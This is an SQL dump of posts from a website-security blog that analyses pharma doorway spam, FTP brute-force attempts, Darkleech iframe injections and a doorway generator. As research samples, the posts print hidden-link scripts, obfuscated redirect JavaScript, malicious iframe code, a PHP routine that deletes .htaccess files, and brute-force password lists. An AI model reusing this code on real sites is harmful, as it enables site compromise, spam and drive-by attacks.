INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (59, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis .To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (60, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (61, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (62, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (63, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (64, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: 